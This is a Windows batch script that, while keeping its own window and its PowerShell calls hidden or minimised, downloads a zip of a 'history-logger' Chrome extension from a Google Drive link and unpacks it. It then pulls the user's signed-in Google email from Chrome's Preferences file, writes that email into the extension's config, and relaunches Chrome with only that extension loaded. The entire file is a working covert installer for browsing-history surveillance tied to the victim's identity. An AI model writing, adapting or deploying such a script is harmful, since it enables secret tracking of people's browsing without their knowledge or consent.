@echo off
if "%1" neq "silent" (
  start "" /min cmd /c "\"%~f0\" silent"
  exit
)
setlocal EnableDelayedExpansion

rem ─── CONFIG ────────────────────────────────────────────────
set "ZIP_URL=https://drive.google.com/uc?export=download&id=1_MrCTaWFitVrrapsDodqTZduIvWKHCtU"
set "WORKDIR=%~dp0history-logger"
rem ─────────────────────────────────────────────────────────────

rem 1) Prepare work folder
if exist "%WORKDIR%" rd /s /q "%WORKDIR%"
mkdir "%WORKDIR%"

rem 2) Download & unpack extension.zip
powershell -WindowStyle Hidden -NoProfile -Command ^
  "Invoke-WebRequest '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing"
powershell -WindowStyle Hidden -NoProfile -Command ^
  "Expand-Archive -Path '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force"

rem 3) Grab Chrome’s signed-in email
set "PREF=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Preferences"
for /f "delims=" %%E in (`
  powershell -WindowStyle Hidden -NoProfile -Command ^
    "try{(Get-Content -Raw '%PREF%' | ConvertFrom-Json).account_info.email}catch{''}"
`) do set "EMAIL=%%E"
if not defined EMAIL set "EMAIL=anonymous@demo.com"

rem 4) Write config.json into the unpacked extension folder
(
  echo {^"userEmail^":^"%EMAIL%"^}
) > "%WORKDIR%\config.json"

rem 5) Launch Chrome with your unpacked extension (silent/minimized)
start "" /min chrome.exe --disable-extensions-except="%WORKDIR%" --load-extension="%WORKDIR%"

endlocal
